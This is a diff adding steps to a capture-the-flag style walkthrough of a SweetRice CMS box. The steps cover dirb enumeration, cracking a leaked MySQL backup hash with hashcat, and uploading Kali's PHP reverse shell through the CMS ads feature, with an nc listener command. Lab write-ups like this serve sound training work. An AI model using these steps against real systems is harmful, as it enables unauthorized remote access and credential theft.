@@ -10,11 +10,64 @@
 
 - nmap shows port 22 and 80 open. SSH can't be brute forced so lets check out the website.
 
-    ![](pix/website.png)
-    - The webpage is the default apache page.
+    ![](pix/website1.png)
+    - The webpage is the default apache page. Something seems to be missing. 
+    
+- Using dirb, lets find some hidden directories. I used the common.txt wordlist found in kali /usr/share/wordlists/dirb/common.txt
+```
+- dirb http://<IP> <PATH TO WORDLIST>
+```
+![](pix/dirb.png)
+- Some interesting pages where found 
+    - http://<IP>/content/ shows the webpage uses SweetRice CMS
+    - http://<IP>/content/as/ shows login page. admin:admin does not work.
+    - http://<IP>/content/inc/ shows the directory index
+    ![](pix/website2.png)
+    - Inside the mysql_backup folder, there is a file called 'mysql_bakup_20191129023059-1.5.1.sql' which might contain the password for the login page.
+    - the file lastest.txt says '1.5.1' which could be the CMS version
 
+## Exploitation
 
+- Looking the the mysql_backup file, I found a string that looks like a username and hash of a password.
+    ```
+    cat mysql_bakup_20191129023059-1.5.1.sql | grep 'pass'
+    ```
 
+    ![](pix/sql.png)
+
+- Save the password hash to a txt file and run hashcat on it using rockyou.txt to perform dictionary brute force. 
+    ```
+    hashcat -m0 pass.txt /usr/share/    wordlists/rockyou.txt
+    ```
+- Hashcat shows the password is 'Password123' ....SMH could have guessed that.
+
+    ![](pix/pass.png)
+
+- Back at the login page to try the username and password. AND WE ARE IN. 
+    ```
+    username: manager
+    password: Password123
+    ```
+
+- After doing some research, it looks like we can upload PHP in the 'Ads' section and pop a reverse shell by visiting that page.
+
+- I went with the php reverse shell provied by Kali linux in ```/usr/share/webshells/php/php-reverse-shell.php```
+    - Make sure to change the ip and port to your local machine.
+
+- Copy the content of php-reverse-shell.php and paste it into the webpage. Name it whatever you want (don not add .php, it will automatically get added). Click done.
+The php code gets uploaded to http://IP/content/inc/ads/shell.php
+
+    ![](pix/shell2.png)
+
+- On the attack machine set up a listener using the same port that you chose. 
+    ``` 
+    nc -lnvp 4444
+    ```
+- To activate the reverse shell, simply visit ```http://IP/content/inc/ads/shell.php```
+
+- ## BAMM! got a shell
+    ![](pix/shell3.png)
+    
 
 
 
